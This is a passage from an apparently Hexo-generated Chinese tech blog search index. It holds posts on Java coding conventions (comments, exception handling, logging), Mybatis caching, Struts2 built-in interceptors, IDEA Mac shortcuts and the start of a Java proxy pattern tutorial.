代码与注释更新不同步，就像路网与导航软件更新不同步一样，如果导航软件严重滞后，就失去了导航的意义。8. 【参考】 合理处理注释掉的代码。在上方详细说明，而不是简单地注释掉。如果无用，则删除。说明： 代码被注释掉有两种可能性：    1. 后续会恢复此段代码逻辑。此时如果没有备注信息，难以知晓注释动机。    2. 永久不用。此时建议直接删掉（代码仓库保存了历史代码）。9. 【参考】 对于注释的要求：第一、能够准确反映涉及思想和代码逻辑；第二、能够描述业务寒意，使别的程序员能够迅速了解到代码背后的信息。完全没有注释的打断代码对于阅读者形同天数，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。10. 【参考】 好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释是相当大的负担。反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">// put elephant into fridgeput(elephant, fridge);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>方法名 put，加上两个有意义的变量名 elephant 和 fridge，已经说明了这是在干什么，语义清晰的代码不需要额外的注释。11. 【参考】 特殊注释标记，请注明标记人与标记时间。注意及时处理这些标记，通过标记扫描，经常清理此类标记。线上故障有时候就是来源于这些标记处的代码。    1. 待办事宜（蓝色开始 TODO 蓝色结束）：（标记人，标记时间，[预计处理时间]）    表示需要实现，但目前还未实现的功能。这实际上是一个 Javadoc 的标签，目前的 Javadoc 还没有实现，但已经被广泛使用。只能应用于类，接口和方法（因为它是一个 Javadoc 标签）。    2. 错误，不能工作（蓝色开始 FIXME 蓝色结束）：（标记人，标记时间，[预计处理时间]）    在注释中用 FIXME 标记某代码是错误的，而且不能工作，需要及时纠正的情况。<br>### （九）其他1. 【强制】 在使用正则表达式时，利用好其预编译功能，可以有效加快正则匹配速度。说明： 不要在方法体内定义：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Pattern pattern = Pattern.compile(规则);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>2. 【强制】 velocity 调用 POJO 类的属性时，建议直接使用属性名取值即可，模板引擎会自动按规范调用 POJO 的 getXxx()，如果是 boolean 基本数据类型变量（boolean 命名不需要加 is 前缀），会自动调用 isXxx() 方法。说明： 注意如果是 Boolean 包装类对象，优先调用 getXxx() 的方法。3. 【强制】 后台输送给页面的变量必须加 `$!{var}`——中间的感叹号。说明： 如果 var = null 或者不存在，那么 ${var} 会直接显示在页面上。4. 【强制】 注意 Math.random() 这个方法返回是 double 类型，注意取值的范围 0 ≤ x &lt; 1 （能够取到蓝色开始零蓝色结束值，注意除零异常），如果想获取整数类型的随机数，不要将 x 放大 10 的若干倍然后取整，直接使用 Random 对象的 蓝色开始 nextInt 蓝色结束 或者 蓝色开始 nextLong 蓝色结束 方法。5. 【强制】 获取当前毫秒数 `System.currentTimeMillis();` 而不是 `new Date().getTime();`说明： 如果想获取更加精确地纳秒级时间值，使用 `System.nanoTime()` 的方式。在 JDK 8 中，针对统计时间等场景，推荐使用 Instant 类。6. 【推荐】 不要在视图模板中加入任何复杂的逻辑。说明： 根据 MVC 理论，视图的职责是展示，不要抢模型和控制器的活。7. 【推荐】 任何数据结构的构造或初始化，都应指定大小，避免数据结构无限增长吃光内存。8. 【推荐】 对于“明确停止使用的代码和配置”，如方法、变量、类、配置文件、动态配置属性等坚决从程序中清理出去，避免造成过多垃圾。<br>## 二、异常日志### （一）异常处理1. 【强制】 Java 类库中定义的一类 RuntimeException 可以通过预先检查进行规避，而不应该通过 catch 来处理，比如：IndexOutOfBoundsException，NullPointerException 等等。说明： 无法通过预检查的异常除外，如在解析一个外部传来的字符串形式数字时，通过 catch NumberFormatException 来实现。正例： `if (obj != null) {...}`反例： `try {obj.method() } catch (NullPointerException e) {...}`2. 【强制】 异常不要用来做流程控制、条件控制，因为异常的处理效率比条件分支低。3. 【强制】 对大段代码进行 try-catch，这是不负责任的表现。catch 时请分清稳定代码和非稳定代码，稳定代码指的是无论如何不会出错的代码。对于非稳定代码的 catch 尽可能进行区分异常类型，再做对应的异常处理。4. 【强制】 捕获异常是为了处理它，不要捕获了却什么都不处理而抛弃之，如果不想处理它，请将该异常抛给它的调用者。最外层的业务使用者，必须处理异常，将其转化为用户可以理解的内容。5. 【强制】 有 try 块放到了事务代码中，catch 异常后，如果需要回滚事务，一定要注意手动回滚事务。6. 【强制】 finally 块必须对资源对象、流对象进行关闭，有异常也要做 try-catch。说明： 如果 JDK 7 及以上，可以使用 try-with-resources 方式。7. 【强制】 不能再 finally 快中使用 return，finally 块中的 return 返回后方法结束执行，不会再执行 try 块中的 return 语句。8. 【强制】 捕获异常与抛异常，必须是完全匹配，或者捕获异常是抛异常的父类。说明： 如果预期对方抛的是绣球，实际接到的是铅球，就会产生意外情况。9. 【推荐】 方法的蓝色开始返回值可以为 null 蓝色结束，不强制返回空集合，或者空对象等，必须添加注释充分说明什么情况下回返回 null 值。调用方需要进行 null 判断放置 NPE 问题。说明： 本手册明确放置 NPE 是调用者的责任。即使被调用方法返回空集合或者空对象，对调用者来说，也并非高枕无忧，必须考虑到远程调用失败、序列化失败、运行时异常等场景返回 null 的情况。10. 【推荐】 防止 NPE，是程序员的基本修养，注意 NPE 产生的场景：    1. 返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 NPE。    反例： `public int f() { return Integer 对象}`，如果为 null，自动拆箱抛 NPE。    2. 数据库的查询结果可能为 null。    3. 集合里的元素即使 isNotEmpty，取出的数据元素也可能为 null。    4. 远程调用返回对象时，一律要求进行空指针判断，防止 NPE。    5. 对于 Session 中获取的数据，建议 NPE 检查，避免空指针。    6. 级联调用 obj.getA().getB().getC()；一连串调用，易产生 NPE。正例： 使用 JDK 8 的 Optional 类来防止 NPE 问题。11. 【推荐】 定义时区分 unchecked / checked 异常，避免直接抛出 new RuntimeException()，更不允许抛出 Exception 或者 Throwable，应使用有业务含义的自定义异常。推荐业界已定义过的自定义异常，如：DAOException / ServiceException 等。12. 【参考】 在代码中使用“抛异常”还是“返回错误码”，对于公司外的 http/api 开放接口必须使用“错误码”；而应用内部推荐异常抛出；跨应用间 RPC 调用优先考虑蓝色开始使用 Result 方式蓝色结束，封装 isSuccess() 方法、“错误码”、“错误简短信息”。说明： 关于 RPC 方法返回方式使用 Result 方式的理由：    1. 使用抛异常返回方式，调用方如果没有捕获到就会产生运行时错误。    2. 如果不加栈信息，只是 new 自定义异常，加入自己的理解的 error message，对于调用端解决问题的帮助不会太多。如果加了栈信息，在频繁调用出错的情况下，数据序列化和传输的性能损耗也是问题。13. 【参考】 避免出现重复的代码（Don't Repeat Yourself），即 DRY 原则。说明： 随意复制和粘贴代码，必然会导致代码的重复，在以后需要修改时，需要修改所有的副本，容易遗漏。必要时抽取共性方法，或者抽象公共类，甚至是公用模块。正例： 一个类中有多个 public 方法，都需要进行数行相同的参数校验操作，这个时候请抽取：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private boolean checkParam(DTO dto) {...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>### （二）日志规约1. 【强制】 应用中不可直接使用日志系统（Log4j、Logback）中的 API，而应该依赖使用日志框架 SLF4J 中的 API，使用门面模式的日志框架，有利于维护和各个类的日志处理方式统一。<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">import org.slf4j.Logger;import org.slf4j.LoggerFactory;...private static final Logger logger = LoggerFactory.getLogger(Abc.class);...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>2. 【强制】 日志文件推荐至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。3. 【强制】 应用中的扩展日志（如打点、临时监控、访问日志等）命名方式：appName_logType_logName.log；    - logType：日志类型，推荐分类有 stats/desc/monitor/visit 等；    - logName：日志描述。这种命名的好处是通过文件名就可知道日志文件属于什么应用，什么类型，什么目的，也有利于归类查找。正例： mppserver 应用中单独监控时区转换异常，如：mppserver_monitor_timeZoneConvert.log说明： 推荐对日志进行分类，如将错误日志和业务日志分开存放，便于开发人员查看，也便于通过日志对系统进行及时监控。4. 【强制】 对 trace/debug/info 级别的日志输出，必须使用条件输出形式或者使用占位符的方式。说明： <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">logger.debug("Processing trad with id: " + id + " symbol: " + symbol);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>如果日志级别是 warn，上述日志不会打印，但是会执行字符串拼接操作，如果 symbol 是对象，会执行 toString() 方法，浪费了系统资源，执行了上述操作，最终日志却没有打印。正例： （条件）<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">if (logger.isDebugEnabled()) {logger.debug("Processing trad with id: " + id + " symbol: " + symbol);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>正例： （占位符）<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">logger.debug("Processing trad with id: {} symbol: {}, id, symbol);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>5. 【强制】 避免重复打印日志，浪费磁盘空间，务必在 log4j.xml 中设置 `additivity="false"`。正例： `<logger name="com.taobao.dubbo.config" additivity="false">`6. 【强制】 异常信息应该包括两类信息：案发现场信息和异常堆栈信息。如果不处理，那么通过关键字 throws 往上抛出。正例： `logger.error(各类参数或者对象 toString + "_" + e.getMessage(), e);`7. 【推荐】 谨慎地记录日志。生产环境禁止输出 debug 日志；有选择的输出 info 日志；如果使用 warn 来记录刚上线时的业务行为信息，一定要注意日志输出量的问题，避免把服务器磁盘撑爆，并记得及时删除这些观察日志。说明： 大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？8. 【参考】 可以使用 warn 日志级别来记录用户输入参数错误的情况，避免用户投诉时，无所适从。注意日志输出的级别，error 级别只记录系统逻辑出错、异常等重要的错误信息。如非必要，请不要在此场景打出 error 级别。<br>## MySQL 数据库### （一）建表规约</logger>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java 开发规范 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis 缓存</title>
      <link href="/2017/06/14/mybatiscache/"/>
      <url>/2017/06/14/mybatiscache/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis-中的缓存"><a href="#Mybatis-中的缓存" class="headerlink" title="Mybatis 中的缓存"></a>Mybatis 中的缓存</h1><p>缓存：一段特殊内存区域。</p><span id="more"></span><h2 id="一级缓存"><a href="#一级缓存" class="headerlink" title="一级缓存"></a>一级缓存</h2><p><strong>一级缓存是 SqlSession 级别的缓存，默认是开启的。</strong>将第一次 sql 语句查询的结果放入到缓存中，第二次如果还发送相同的 sql 语句查询的话，优先从缓存中获取，如果缓存中没有响应的数据，再查询数据库，这样的话，降低数据库的压力，提高系统的性能。</p><blockquote><p>一级缓存在事务提交后，一级缓存数据也会释放，防止数据的脏读。<br>每个 session 都有自己独立的一级缓存，不能跨 session 访问。</p></blockquote><br>## 二级缓存数据**二级缓存比一级缓存范围大，跨 session 获取缓存数据。**其实质也是将缓存数据放在 Map 结构中。在实际企业中，一般会用到缓存框架(ehcache oscache swarmcache)<p>服务器集群：很多个服务器在一起，响应用户的多个请求。<br>Ngnix 负载均衡：让服务器均衡的处理用户的多个请求</p><p>Mybatis 默认只支持将二级缓存数据保存到单个服务器中，如果在分布式的服务器环境中，就必须用到支持分布式的缓存框架(如 ehcache)</p><h3 id="ehcache"><a href="#ehcache" class="headerlink" title="ehcache"></a>ehcache</h3><p>不但支持单机缓存，还支持分布式缓存。（适用于服务器集群环境中）</p><ol><li>引入依赖包（ehcache）和中间件()</li><li>启用二级缓存<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setting</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cacheEnabled<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>类路径下，配置 ehcache.xml<br>配置 ehcache 对二级缓存的管理（二级缓存中最大存放的元素数量，间隔访问时间，存活时间，是否永久存放在二级缓存中，是否支持缓存数据往硬盘序列化）</li><li>在 *Mapper.xml 中添加 <code>&lt;cache type="org.mybatis.caches.ehcache.EhcacheCache"&gt;&lt;/cache&gt;</code> 标签</li></ol><blockquote><p>开启二级缓存后，即使关闭旧的 session，也可以在新的 session 中获取到旧 session 的数据；<br>二级缓存同一级缓存一样会在事务提交后清空数据，避免脏读；<br>二级缓存一般用在数据变化不是很快的应用或对数据实时性要求不高的应用中。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
            <tag> 缓存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2 内建拦截器简介</title>
      <link href="/2017/06/08/struts2builtininterceptor/"/>
      <url>/2017/06/08/struts2builtininterceptor/</url>
      
        <content type="html"><![CDATA[<p>Struts 2 中有很多内置拦截器，本文将简单的<br>非常简单的…）介绍各个内置拦截器的作用。</p><span id="more"></span><h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p><strong>别名拦截器：</strong>允许参数在跨越多个请求时使用不同别名，该拦截器可将多个 Action 采用不同名字链接起来，然后用于处理同一信息。</p><h2 id="autowiring"><a href="#autowiring" class="headerlink" title="autowiring"></a>autowiring</h2><p><strong>自动装配拦截器：</strong>主要用于当 Struts 2 和 Spring 整合时，Struts 2 可以使用自动装配的方式来访问 Spring 容器中的 Bean。</p><h2 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h2><p><strong>链拦截器：</strong>构建一个 Action 链，使当前 Action 可以访问前一个 Action 的请求信息，一般和 <code>&lt;result type="chain" .../&gt;</code> 一起使用。</p><h2 id="checkbox"><a href="#checkbox" class="headerlink" title="checkbox"></a>checkbox</h2><p><strong>多选框拦截器：</strong>将没有选中的 checkbox 项设置为 false，协助管理多选框。在 HTTP 请求里，那些没有被选中的项通常没有任何值。</p><h2 id="conversionError"><a href="#conversionError" class="headerlink" title="conversionError"></a>conversionError</h2><p><strong>转换器错误拦截器：</strong>这是一个负责处理类型转换错误的拦截器，它负责将类型转换错误从 ActionContext 中取出，并转换成 Action 的 FieldError 错误。</p><h2 id="createSession"><a href="#createSession" class="headerlink" title="createSession"></a>createSession</h2><p><strong>创建 Session 拦截器：</strong>该拦截器负责创建一个 HttpSession 对象，主要用于那些需要有 HttpSession 对象才能正常工作的拦截器中。</p><h2 id="clearSession"><a href="#clearSession" class="headerlink" title="clearSession"></a>clearSession</h2><p><strong>清除 Session 拦截器：</strong>负责销毁 HttpSession 对象。</p><h2 id="debugging"><a href="#debugging" class="headerlink" title="debugging"></a>debugging</h2><p><strong>调试拦截器：</strong>当使用 Struts 2 的开发模式时，这个拦截器会提供更多的调试信息。</p><h2 id="execAndWait"><a href="#execAndWait" class="headerlink" title="execAndWait"></a>execAndWait</h2><p><strong>执行和等待拦截器：</strong>后台执行 Action 时，给用户显示一个过渡性的等待页面。</p><h2 id="externalRef"><a href="#externalRef" class="headerlink" title="externalRef"></a>externalRef</h2><p><strong>扩展拦截器：</strong>负责扩展引用。</p><h2 id="exception"><a href="#exception" class="headerlink" title="exception"></a>exception</h2><p><strong>异常拦截器：</strong>将 Action 抛出的异常映射到结果，这样就通过重定向自动处理异常。</p><h2 id="fileUpload"><a href="#fileUpload" class="headerlink" title="fileUpload"></a>fileUpload</h2><p><strong>文件上传拦截器：</strong>这个拦截器主要用于文件上传，它负责解析表单中文件域的内容。</p><h2 id="i18n"><a href="#i18n" class="headerlink" title="i18n"></a>i18n</h2><p><strong>国际化拦截器：</strong>主要负责把用户所选的语言、区域放入用户 Session 中。</p><h2 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h2><p><strong>日志拦截器：</strong>主要是输出 Action 的名字，提供简单的日志输出。</p><h2 id="modelDriven"><a href="#modelDriven" class="headerlink" title="modelDriven"></a>modelDriven</h2><p><strong>模型驱动拦截器：</strong>这是一个用于模型驱动的拦截器，当某个 Action 类实现了 ModelDriven 接口时，它负责把 getModel() 方法的结果堆入 ValueStack 中。</p><h2 id="scopedModelDriven"><a href="#scopedModelDriven" class="headerlink" title="scopedModelDriven"></a>scopedModelDriven</h2><p><strong>作用域模型驱动拦截器：</strong>如果一个 Action 实现了一个 ScopedModelDriven 接口，该拦截器负责从指定生存范围中找出指定的 Model，并将通过 setModel 方法将该 Model 传给 Action 实例。</p><h2 id="params"><a href="#params" class="headerlink" title="params"></a>params</h2><p><strong>参数过滤拦截器：</strong>这是一个最基本的拦截器，它负责解析 HTTP 请求中的参数，并将参数值设置成 Action 对应的属性值。</p><h2 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h2><p><strong>预备拦截器：</strong>如果 action 实现了 Preparable 接口，将会调用该拦截器的 prepare() 方法。</p><h2 id="staticParams"><a href="#staticParams" class="headerlink" title="staticParams"></a>staticParams</h2><p><strong>静态参数拦截器：</strong>这个拦截器负责将 xml 中 <code>&lt;action&gt;</code> 标签下 <code>&lt;param&gt;</code> 标签中的参数传入 action。</p><h2 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h2><p><strong>作用域拦截器：</strong>这是范围转换拦截器，它可以将 Action 状态信息保存到 HttpSession 范围，或者保存到 ServletContext 范围内。</p><h2 id="servletConfig"><a href="#servletConfig" class="headerlink" title="servletConfig"></a>servletConfig</h2><p><strong>Servlet 配置拦截器：</strong>如果某个 Action 需要直接访问 Servlet API，就是通过这个拦截器实现的，它提供访问 HttpServletRequest 和 HttpServletResponse 的方法，以 map 方式访问。</p><h2 id="roles"><a href="#roles" class="headerlink" title="roles"></a>roles</h2><p><strong>角色拦截器：</strong>这是一个 JAAS（Java Authentication and Authorization Service，Java 授权和认证服务）拦截器，只有当浏览者取得合适的授权后，才可以调用被该拦截器拦截的 Action。</p><h2 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h2><p><strong>计时拦截器：</strong>这个拦截器负责输出 Action 的执行时间，在分析该 Action 的性能瓶颈时比较有用。</p><h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p><strong>令牌拦截器：</strong>这个拦截器主要用于阻止重复提交，它检查传到 Action 中的 token，从而防止多次提交。</p><h2 id="tokenSession"><a href="#tokenSession" class="headerlink" title="tokenSession"></a>tokenSession</h2><p><strong>令牌会话拦截器：</strong>这个拦截器的作用与前一个基本类似，只是它把非法提交的数据保存在 HttpSession 中，不跳转到错误页面，再次生成与第一次相同的响应页面。</p><h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p><strong>验证拦截器：</strong>通过执行在 xxxAction-validation.xml 中定义的校验器，从而完成数据校验。</p><h2 id="workflow"><a href="#workflow" class="headerlink" title="workflow"></a>workflow</h2><p><strong>工作流拦截器：</strong>这个拦截器负责调用 Action 类中的 validate 方法，如果校验失败，则不执行业务方法，而是返回 input 的逻辑视图。</p><h2 id="jsonValidation"><a href="#jsonValidation" class="headerlink" title="jsonValidation"></a>jsonValidation</h2><p><strong>json 拦截器：</strong>验证失败时，可以将 fieldError 和 actionErrors 信息序列化成 json，返回给客户端。</p><h2 id="profiling"><a href="#profiling" class="headerlink" title="profiling"></a>profiling</h2><p><strong>概要拦截器：</strong>允许 Action 记录简单的概要信息。</p><h2 id="actionMappingParams"><a href="#actionMappingParams" class="headerlink" title="actionMappingParams"></a>actionMappingParams</h2><p><strong>Action 映射拦截器：</strong>Parameters set by the action mapping are not set/not available through ParameterAware.</p><h2 id="annotationWorkflow"><a href="#annotationWorkflow" class="headerlink" title="annotationWorkflow"></a>annotationWorkflow</h2><p><strong>注解工作流拦截器：</strong>利用注解替代 XML 配置，使用 annotationWorkflow 拦截器可以使用 @After、@Before、@BeforeResult 等注解，执行流程为 before-execute-beforeResult-after 顺序。</p><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p><strong>消息存储拦截器：</strong>在会话中为 Action 存储和检索消息、字段错误以及 Action 错误，该拦截器要求 Action 实现 ValidationAware 接口。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts 2 </tag>
            
            <tag> 拦截器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA keymap for Mac</title>
      <link href="/2017/06/01/ideakeymapformac/"/>
      <url>/2017/06/01/ideakeymapformac/</url>
      
        <content type="html"><![CDATA[<p>刚刚从 Eclipse 转到 IDEA、从 Windows 转到 Mac 系统，马上就爱上了 IDEA 编译工具，并且打算以后主要使用 Mac 开发，所以决定不再使用 Eclipse 的快捷键了。为了方便记忆和查找，特此记录下常用快捷键。</p><span id="more"></span><h2 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h2><table><thead><tr><th align="left">描述</th><th align="center">快捷键</th></tr></thead><tbody><tr><td align="left">撤销</td><td align="center">command + Z</td></tr><tr><td align="left">重复</td><td align="center">shift + command + Z</td></tr><tr><td align="left">剪切</td><td align="center">command + X</td></tr><tr><td align="left">复制</td><td align="center">command + C</td></tr><tr><td align="left">复制路径</td><td align="center">shift + command + C</td></tr><tr><td align="left">复制引用</td><td align="center">option + shift + command + C</td></tr><tr><td align="left">粘贴</td><td align="center">command + V</td></tr><tr><td align="left">从历史粘贴</td><td align="center">shift + command + V</td></tr><tr><td align="left">查找替换</td><td align="center">command + F</td></tr><tr><td align="left">查找移动到下一个</td><td align="center">command + G</td></tr><tr><td align="left">查找移动到下一个</td><td align="center">shift + command +G</td></tr><tr><td align="left">选择全部结果</td><td align="center">control + command + G</td></tr><tr><td align="left">查找调用</td><td align="center">option + F7</td></tr><tr><td align="left">限时调用</td><td align="center">option + command +F7</td></tr><tr><td align="left">扩展选择内容</td><td align="center">option + ⬆️</td></tr><tr><td align="left">收缩选择内容</td><td align="center">option + ⬇️</td></tr><tr><td align="left">补全当前语句</td><td align="center">shift + command + return</td></tr><tr><td align="left">跳到行</td><td align="center">control + shift + J</td></tr><tr><td align="left">复制粘贴当前或选择行</td><td align="center">command + D</td></tr><tr><td align="left">切换 Case</td><td align="center">shift + command + U</td></tr><tr><td align="left">下一个参数</td><td align="center">tab</td></tr><tr><td align="left">上一个参数</td><td align="center">shift + tab</td></tr><tr><td align="left">表情符号</td><td align="center">option + command + space</td></tr><tr><td align="left">偏好设置</td><td align="center">command + ,</td></tr><tr><td align="left">项目组织结构</td><td align="center">command + ;</td></tr><tr><td align="left">保存全部</td><td align="center">command + S</td></tr><tr><td align="left">同步</td><td align="center">option + command + Y</td></tr><tr><td align="left">退出</td><td align="center">command + Q</td></tr></tbody></table><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><table><thead><tr><th align="left">描述</th><th align="center">快捷键</th></tr></thead><tbody><tr><td align="left">快速定义</td><td align="center">option + space command + Y</td></tr><tr><td align="left">快速 Documentation</td><td align="center">F1 control + J control + button2 click</td></tr><tr><td align="left">外部 Dovumentation</td><td align="center">shift + F1</td></tr><tr><td align="left">参数信息</td><td align="center">conmand + P</td></tr><tr><td align="left">表达式类型</td><td align="center">option + shift + P</td></tr><tr><td align="left">内容信息</td><td align="center">option + shift + Q</td></tr><tr><td align="left">错误描述</td><td align="center">command + F1</td></tr><tr><td align="left">跳到 Source</td><td align="center">command + ⬇️ F4</td></tr><tr><td align="left">显示 Source</td><td align="center">command + return</td></tr><tr><td align="left">最近文件</td><td align="center">command + E</td></tr><tr><td align="left">最近修改的文件</td><td align="center">shift + command + E</td></tr></tbody></table><h2 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h2><table><thead><tr><th align="left">描述</th><th align="center">快捷键</th></tr></thead><tbody><tr><td align="left">类…</td><td align="center">command + O</td></tr><tr><td align="left">文件…</td><td align="center">shift + command + O</td></tr><tr><td align="left">Symbol…</td><td align="center">option + command + O</td></tr><tr><td align="left"></td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 的三种代理模式</title>
      <link href="/2017/05/27/threeproxymodel/"/>
      <url>/2017/05/27/threeproxymodel/</url>
      
        <content type="html"><![CDATA[<p>代理（Proxy）是一种设计模式，提供了对目标对象另外的访问方式，即通过代理对象访问目标对象，这样做的好处是：可以在目标对象实现的基础上，增强额外的功能操作，即扩展目标对象的功能。<br>这里使用到编程中的一个思想：不要随意去修改别人已经写好的代码或者方法，如果需要修改，可以通过代理的方式来扩展该方法。</p><ul><li><a href="https://github.com/CrazyBunQnQ/ShowMeCode/tree/master/src/main/java/com/crazybunqnq/designpattern/proxy">Source code</a></li><li><a href="https://github.com/CrazyBunQnQ/ShowMeCode/tree/master/src/test/java/designmodle/proxy">Unit Test</a></li></ul><span id="more"></span><p>举个例子来说明代理的作用：<br>假设我们想邀请一位明星，那么并不是直接连接明星，而是联系明星的经纪人，来达到同样的目的。明星就是一个目标对象，他只要负责活动中的节目，而其他琐碎的事情就交给他的代理人（经纪人）来解决。这就是代理思想在现实中的一个例子。<br>用图表示如下：</p><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1fgb9aigh6lj20ez08ft8r.jpg" alt="代理模式"></p><ol><li>RealSubject 是委托类，Proxy 是代理类；</li><li>Subject 是委托类和代理类的接口；</li><li>request() 是委托类和代理类的共同方法。<blockquote><p>代理模式的关键点是：代理对象与目标对象：代理对象是对目标对象的扩展，并会调用目标对象。</p></blockquote></li></ol><br><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理在使用时，需要定义接口或者父类，被代理对象与代理对象一起实现相同的接口或者是继承相同父类。</p><p>下面举个例子来解释：<br>模拟 request 动作，定义一个 request 动作的接口：Subject.java，然后目标对象（RealSubject.java）实现这个接口的方法 request()，此时如果使用静态代理方式，就需要在代理对象（Proxy.java）中也实现 Subject 接口。调用的时候通过调用代理对象的方法来调用目标对象。</p><blockquote><p>需要注意的是，<strong>代理对象与目标对象要实现相同的接口，然后通过调用相同的方法来调用目标对象的方法。</strong></p></blockquote><h3 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h3><p>接口：Subject.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目标对象：RealSubject.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RealSubject</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"RealSubject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代理类：Proxy.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Subject</span> subject<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subject <span class="token operator">=</span> subject<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        subject<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 